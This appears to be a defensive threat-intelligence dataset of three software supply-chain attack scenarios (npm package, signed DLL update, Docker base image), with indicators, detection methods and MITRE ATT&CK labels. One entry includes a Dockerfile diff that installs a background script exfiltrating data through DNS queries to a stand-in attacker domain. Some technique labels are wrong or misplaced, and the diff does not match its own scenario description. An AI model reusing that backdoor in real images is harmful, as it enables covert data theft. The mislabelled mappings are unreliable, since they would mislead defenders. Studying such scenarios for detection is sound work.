examples.scenario: Attackers compromised the update server of a popular open-source JavaScript library, injecting malicious code into the distributed npm package. This code exfiltrates environment variables and sends them to an attacker-controlled C2 domain during initialization.

indicators: Unexpected HTTP outbound connection to http://malicious-c2.example.com/collect

examples.detection_method: Monitor outbound HTTP connections from build and runtime environments; verify code signatures and integrity of third-party dependencies against trusted SBOMs; alert on anomalous environment variable exfiltration attempts; correlate npm publish logs with suspicious user activity.

T1584.006 - Compromise Software Supply Chain: Compromise Software Dependencies

examples.scenario: A malicious actor infiltrated the update mechanism of a widely-used Windows utility by injecting a trojanized DLL into the update package. The DLL is signed with a stolen code signing certificate, enabling it to bypass integrity checks and execute during software startup.

examples.detection_method: Verify code signing certificates against revocation lists and known trusted certificates; monitor process creation chains for unsigned or unexpected DLLs loaded by critical executables; inspect TLS SNI fields for suspicious domains; audit update manifests against known baselines; monitor registry changes related to telemetry and configuration.

T1055.001 - Process Injection: Dynamic-link Library Injection

examples.scenario: An attacker altered the Docker container base image in a public container registry by injecting a backdoor that listens on a high port and communicates with attacker C2 via DNS tunneling. The compromised image was pulled automatically by CI/CD pipelines, spreading the malicious code into production environments.

technical_data.dockerfile_diff:
--- original/Dockerfile
+++ compromised/Dockerfile
@@ -10,6 +10,10 @@
 RUN apt-get update && apt-get install -y curl bash
+
+# Malicious backdoor installation
+RUN echo '#!/bin/bash\nwhile true; do dig @8.8.8.8 -p 53 "$(cat /tmp/cmd.txt).malicious.com" ; sleep 10; done &' > /usr/local/bin/backdoor.sh
+RUN chmod +x /usr/local/bin/backdoor.sh
+RUN /usr/local/bin/backdoor.sh &
container_runtime_logs: 2024-05-21T11:45:00Z Container baseimage started with image sha256:9b2e8e...

indicators: Docker image SHA256 digest mismatch with known-good baseline
Unusual DNS TXT queries to malicious.com from container IPs
Continuous DNS queries every ~10 seconds from container
examples.detection_method: Implement SBOM tracking and image signature verification in CI/CD pipelines; monitor DNS traffic from containers for anomalous TXT queries; alert on image digest mismatches; scan container layers for unauthorized scripts or binaries; monitor container runtime logs for unexpected script executions.
relevant_mitre_techniques: T1195.003 - Supply Chain Compromise: Compromise Container Image
